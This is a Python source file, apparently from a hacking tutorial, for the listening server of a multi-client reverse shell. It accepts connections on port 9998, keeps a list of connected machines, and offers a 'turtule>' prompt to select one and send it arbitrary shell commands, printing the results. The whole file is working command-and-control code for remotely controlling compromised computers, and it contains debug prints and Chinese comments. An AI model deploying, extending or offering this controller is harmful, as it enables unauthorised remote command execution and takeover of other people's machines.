import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address = []

# Create a Socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        print('Socket creation success')

        host = ''
        port = 9998
        s = socket.socket()

    except socket.error as msg:
        print('Socket creation error:'+str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print('Binding the Port'+ str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print('Socket Binding error' + str(msg) + '\n' + 'Retrying...')
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted
def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(True)     # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print('Connection has been established:' + address[0])
        except:
            print('Error accepting connections')

# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to a connected client
# Interactive prompt for sending commands
# turtule> list
# 0 Friend A
# 1 Friend B
# 2 Friend C
# select 1

def start_turtle():
    while True:
        cmd = input('turtule> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print('Command not recognized')

# Display all current active connections with the client
def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + '   ' + str(all_address[i][0]) + '   ' + str(all_address[i][1])

    print('---- Client ----' + '\n' + results)

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')     # target = id
        target = int(target)
        conn = all_connections[target]
        print('You are now connected to i' + str(all_address[target][0]))
        print(str(all_address[target][0]) + '>', end='')
        return conn
    except:
        print('Selection not valid')
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),'utf-8')
                print(client_response, end='')
        except:
            print('Error sending commands')
            break

# Create worker threads
def create_workers():
    print('==============================start create_workerss==============================')
    for num in range(NUMBER_OF_THREADS):
        print('第{}轮'.format(num))
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()       # start以后线程t才开始进行work

        print('t.start done')

# Do next job that is in the queue (handle connections, send commands)
def work():
    print('>>>>>>>>>>>>>>>start work<<<<<<<<<<<<<<'+'\n')
    while True:
        print('我作证运行了这部分')
        x = queue.get()
        print('x value is:',x)
        if x == 1:

            create_socket()
            bind_socket()
            accepting_connection()
            print('x == 1')
        if x == 2:
            start_turtle()
            print('x == 2')

        queue.task_done()
        print('queue.task_done')

def create_jobs():
    print('==============================start create_jobs==============================')
    for x in JOB_NUMBER:
        # print('x is:',x)
        queue.put(x)
        # print('queue.put {} done'.format(x))
        # print('queue size now:',queue.qsize())

    queue.join()

create_workers()
create_jobs()

























































